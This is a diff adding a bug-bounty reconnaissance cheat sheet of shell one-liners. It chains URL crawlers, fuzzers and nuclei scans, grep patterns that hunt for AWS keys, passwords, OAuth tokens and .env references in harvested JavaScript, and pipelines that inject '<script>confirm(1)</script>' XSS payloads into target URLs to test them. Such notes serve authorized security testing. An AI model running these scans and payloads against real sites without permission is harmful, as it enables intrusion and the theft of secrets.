@@ -1,0 +1,56 @@
+secret finder
+cat js.txt | while read url; do python3 /home/pk/secretfinder/SecretFinder.py -i $url -o cli >> secret.txt;done
+
+waybackurls domain.com |urldedupe -qs | qsreplace "</script><script>confirm(1)</script>" | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+katana:
+katana -list live.txt -jc -v | grep ".js$" |tee js.txt 
+cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
+
+httpx-toolkit :
+cat domain.txt |httpx-toolkit > live.tx 
+cat domain.txt |httpx-toolkit --status-code --title -server --tech-detect
+
+FUff
+ffuf -w /usr/share/wordlists/dirb/big.txt -recursion -u https://studentportal.example.com/
+fuff -w apache.txt -u http://domain.com/FUZZ
+wordlist: https://github.com/danielmiessler/SecLists/
+
+Waybackurls:
+waybackurls http://domain.com
+
+nuclei: 
+nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt
+
+
+*********************************
+file="js.txt"
+
+# Loop through each line in the file
+while IFS= read -r link
+do
+    # Download the JavaScript file using wget
+    wget "$link"
+done < "$file"
+
+
+##Command to get secret
+grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" *.js
+
+
+#paramspider:XSS 
+paramspider -d target.com | qsreplace  '"/><script>confirm(1)</script>' > xss.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+#feroxbuster
+sudo apt update && sudo apt install -y feroxbuster
+feroxbuster -u https://target.com
+
+#arjun
+for finding parameters
+
+
+# KXSS
+
+#socialhunter
+go install github.com/utkusen/socialhunter@latest
+socialhunter -f urls.txt
